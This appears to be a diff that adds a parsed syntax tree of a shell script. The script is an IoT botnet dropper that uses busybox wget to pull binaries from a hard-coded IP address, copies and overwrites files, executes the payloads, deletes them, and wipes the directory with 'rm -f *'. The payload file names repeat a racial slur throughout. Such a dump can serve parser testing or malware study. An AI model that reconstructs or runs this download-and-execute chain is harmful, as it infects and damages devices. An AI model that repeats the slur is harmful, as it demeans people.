+  ]),
+  OperatorNode(lineno=35, op=';', pos=(2177, 2178)),
+  CommandNode(lineno=35, pos=(2179, 2205), parts=[
+    WordNode(lineno=35, pos=(2179, 2186), word='busybox'),
+    WordNode(lineno=35, pos=(2187, 2189), word='cp'),
+    WordNode(lineno=35, pos=(2190, 2202), word='/bin/busybox'),
+    WordNode(lineno=35, pos=(2203, 2205), word='./'),
+  ]),
+  OperatorNode(lineno=35, op=';', pos=(2205, 2206)),
+  CommandNode(lineno=35, pos=(2207, 2236), parts=[
+    WordNode(lineno=35, pos=(2207, 2214), word='busybox'),
+    WordNode(lineno=35, pos=(2215, 2218), word='cat'),
+    WordNode(lineno=35, pos=(2219, 2226), word='nigger6'),
+    RedirectNode(lineno=35, output=
+      WordNode(lineno=35, pos=(2229, 2236), word='busybox'), pos=(2227, 2236), type='>'),
+  ]),
+  OperatorNode(lineno=35, op=';', pos=(2236, 2237)),
+  CommandNode(lineno=35, pos=(2238, 2259), parts=[
+    WordNode(lineno=35, pos=(2238, 2245), word='busybox'),
+    WordNode(lineno=35, pos=(2246, 2248), word='rm'),
+    WordNode(lineno=35, pos=(2249, 2251), word='-f'),
+    WordNode(lineno=35, pos=(2252, 2259), word='nigger6'),
+  ]),
+  OperatorNode(lineno=35, op=';', pos=(2259, 2260)),
+  CommandNode(lineno=35, pos=(2261, 2287), parts=[
+    WordNode(lineno=35, pos=(2261, 2268), word='busybox'),
+    WordNode(lineno=35, pos=(2269, 2271), word='cp'),
+    WordNode(lineno=35, pos=(2272, 2279), word='busybox'),
+    WordNode(lineno=35, pos=(2280, 2287), word='nigger6'),
+  ]),
+  OperatorNode(lineno=35, op=';', pos=(2287, 2288)),
+  CommandNode(lineno=35, pos=(2289, 2310), parts=[
+    WordNode(lineno=35, pos=(2289, 2296), word='busybox'),
+    WordNode(lineno=35, pos=(2297, 2299), word='rm'),
+    WordNode(lineno=35, pos=(2300, 2302), word='-f'),
+    WordNode(lineno=35, pos=(2303, 2310), word='busybox'),
+  ]),
+  OperatorNode(lineno=35, op=';', pos=(2310, 2311)),
+  CommandNode(lineno=35, pos=(2312, 2321), parts=[
+    WordNode(lineno=35, pos=(2312, 2321), word='./nigger6'),
+  ]),
+  OperatorNode(lineno=35, op=';', pos=(2321, 2322)),
+  CommandNode(lineno=35, pos=(2323, 2345), parts=[
+    WordNode(lineno=35, pos=(2323, 2330), word='busybox'),
+    WordNode(lineno=35, pos=(2331, 2333), word='rm'),
+    WordNode(lineno=35, pos=(2334, 2336), word='-f'),
+    WordNode(lineno=35, pos=(2337, 2345), word='nigger6*'),
+  ]),
+])
+CommandNode(lineno=36, pos=(2346, 2353), parts=[
+  WordNode(lineno=36, pos=(2346, 2348), word='rm'),
+  WordNode(lineno=36, pos=(2349, 2351), word='-f'),
+  WordNode(lineno=36, pos=(2352, 2353), word='*'),
+])
+ListNode(lineno=37, pos=(2354, 2565), parts=[
+  CommandNode(lineno=37, pos=(2354, 2397), parts=[
+    WordNode(lineno=37, pos=(2354, 2361), word='busybox'),
+    WordNode(lineno=37, pos=(2362, 2366), word='wget'),
+    WordNode(lineno=37, pos=(2367, 2397), word='http://185.103.109.204/nigger7'),
+  ]),
+  OperatorNode(lineno=37, op=';', pos=(2397, 2398)),
+  CommandNode(lineno=37, pos=(2399, 2425), parts=[
+    WordNode(lineno=37, pos=(2399, 2406), word='busybox'),
+    WordNode(lineno=37, pos=(2407, 2409), word='cp'),
+    WordNode(lineno=37, pos=(2410, 2422), word='/bin/busybox'),
+    WordNode(lineno=37, pos=(2423, 2425), word='./'),
+  ]),
+  OperatorNode(lineno=37, op=';', pos=(2425, 2426)),
+  CommandNode(lineno=37, pos=(2427, 2456), parts=[
+    WordNode(lineno=37, pos=(2427, 2434), word='busybox'),
+    WordNode(lineno=37, pos=(2435, 2438), word='cat'),
+    WordNode(lineno=37, pos=(2439, 2446), word='nigger7'),
+    RedirectNode(lineno=37, output=
+      WordNode(lineno=37, pos=(2449, 2456), word='busybox'), pos=(2447, 2456), type='>'),
+  ]),
+  OperatorNode(lineno=37, op=';', pos=(2456, 2457)),
+  CommandNode(lineno=37, pos=(2458, 2479), parts=[
+    WordNode(lineno=37, pos=(2458, 2465), word='busybox'),
+    WordNode(lineno=37, pos=(2466, 2468), word='rm'),
+    WordNode(lineno=37, pos=(2469, 2471), word='-f'),
+    WordNode(lineno=37, pos=(2472, 2479), word='nigger7'),
+  ]),
+  OperatorNode(lineno=37, op=';', pos=(2479, 2480)),
+  CommandNode(lineno=37, pos=(2481, 2507), parts=[
+    WordNode(lineno=37, pos=(2481, 2488), word='busybox'),
+    WordNode(lineno=37, pos=(2489, 2491), word='cp'),
+    WordNode(lineno=37, pos=(2492, 2499), word='busybox'),
+    WordNode(lineno=37, pos=(2500, 2507), word='nigger7'),
+  ]),
+  OperatorNode(lineno=37, op=';', pos=(2507, 2508)),
+  CommandNode(lineno=37, pos=(2509, 2530), parts=[
+    WordNode(lineno=37, pos=(2509, 2516), word='busybox'),
+    WordNode(lineno=37, pos=(2517, 2519), word='rm'),
+    WordNode(lineno=37, pos=(2520, 2522), word='-f'),
+    WordNode(lineno=37, pos=(2523, 2530), word='busybox'),
+  ]),
+  OperatorNode(lineno=37, op=';', pos=(2530, 2531)),
+  CommandNode(lineno=37, pos=(2532, 2541), parts=[
+    WordNode(lineno=37, pos=(2532, 2541), word='./nigger7'),
+  ]),
+  OperatorNode(lineno=37, op=';', pos=(2541, 2542)),
+  CommandNode(lineno=37, pos=(2543, 2565), parts=[
+    WordNode(lineno=37, pos=(2543, 2550), word='busybox'),
+    WordNode(lineno=37, pos=(2551, 2553), word='rm'),
+    WordNode(lineno=37, pos=(2554, 2556), word='-f'),
+    WordNode(lineno=37, pos=(2557, 2565), word='nigger7*'),
+  ]),
+])
+ListNode(lineno=39, pos=(2567, 2778), parts=[
+  CommandNode(lineno=39, pos=(2567, 2610), parts=[
+    WordNode(lineno=39, pos=(2567, 2574), word='busybox'),
+    WordNode(lineno=39, pos=(2575, 2579), word='wget'),
+    WordNode(lineno=39, pos=(2580, 2610), word='http://185.103.109.204/nigger8'),
+  ]),
+  OperatorNode(lineno=39, op=';', pos=(2610, 2611)),
+  CommandNode(lineno=39, pos=(2612, 2638), parts=[
+    WordNode(lineno=39, pos=(2612, 2619), word='busybox'),
+    WordNode(lineno=39, pos=(2620, 2622), word='cp'),
+    WordNode(lineno=39, pos=(2623, 2635), word='/bin/busybox'),
+    WordNode(lineno=39, pos=(2636, 2638), word='./'),
+  ]),
+  OperatorNode(lineno=39, op=';', pos=(2638, 2639)),
+  CommandNode(lineno=39, pos=(2640, 2669), parts=[
+    WordNode(lineno=39, pos=(2640, 2647), word='busybox'),
+    WordNode(lineno=39, pos=(2648, 2651), word='cat'),
+    WordNode(lineno=39, pos=(2652, 2659), word='nigger8'),
+    RedirectNode(lineno=39, output=
+      WordNode(lineno=39, pos=(2662, 2669), word='busybox'), pos=(2660, 2669), type='>'),
+  ]),
+  OperatorNode(lineno=39, op=';', pos=(2669, 2670)),
+  CommandNode(lineno=39, pos=(2671, 2692), parts=[
+    WordNode(lineno=39, pos=(2671, 2678), word='busybox'),
+    WordNode(lineno=39, pos=(2679, 2681), word='rm'),
+    WordNode(lineno=39, pos=(2682, 2684), word='-f'),
+    WordNode(lineno=39, pos=(2685, 2692), word='nigger8'),
+  ]),
+  OperatorNode(lineno=39, op=';', pos=(2692, 2693)),
+  CommandNode(lineno=39, pos=(2694, 2720), parts=[
+    WordNode(lineno=39, pos=(2694, 2701), word='busybox'),
+    WordNode(lineno=39, pos=(2702, 2704), word='cp'),
+    WordNode(lineno=39, pos=(2705, 2712), word='busybox'),
+    WordNode(lineno=39, pos=(2713, 2720), word='nigger8'),
+  ]),
+  OperatorNode(lineno=39, op=';', pos=(2720, 2721)),
+  CommandNode(lineno=39, pos=(2722, 2743), parts=[
+    WordNode(lineno=39, pos=(2722, 2729), word='busybox'),
+    WordNode(lineno=39, pos=(2730, 2732), word='rm'),
+    WordNode(lineno=39, pos=(2733, 2735), word='-f'),
+    WordNode(lineno=39, pos=(2736, 2743), word='busybox'),
+  ]),
+  OperatorNode(lineno=39, op=';', pos=(2743, 2744)),
+  CommandNode(lineno=39, pos=(2745, 2754), parts=[
+    WordNode(lineno=39, pos=(2745, 2754), word='./nigger8'),
+  ]),
+  OperatorNode(lineno=39, op=';', pos=(2754, 2755)),
+  CommandNode(lineno=39, pos=(2756, 2778), parts=[
+    WordNode(lineno=39, pos=(2756, 2763), word='busybox'),
+    WordNode(lineno=39, pos=(2764, 2766), word='rm'),
+    WordNode(lineno=39, pos=(2767, 2769), word='-f'),
+    WordNode(lineno=39, pos=(2770, 2778), word='nigger8*'),
+  ]),
+])
+CommandNode(lineno=40, pos=(2779, 2786), parts=[
+  WordNode(lineno=40, pos=(2779, 2781), word='rm'),
+  WordNode(lineno=40, pos=(2782, 2784), word='-f'),
+  WordNode(lineno=40, pos=(2785, 2786), word='*'),
+])
+CommandNode(lineno=41, pos=(2787, 2794), parts=[
+  WordNode(lineno=41, pos=(2787, 2792), word='sleep'),
+  WordNode(lineno=41, pos=(2793, 2794), word='1'),
+])
+CommandNode(lineno=42, pos=(2795, 2799), parts=[
+  WordNode(lineno=42, pos=(2795, 2799), word='exit'),
+])
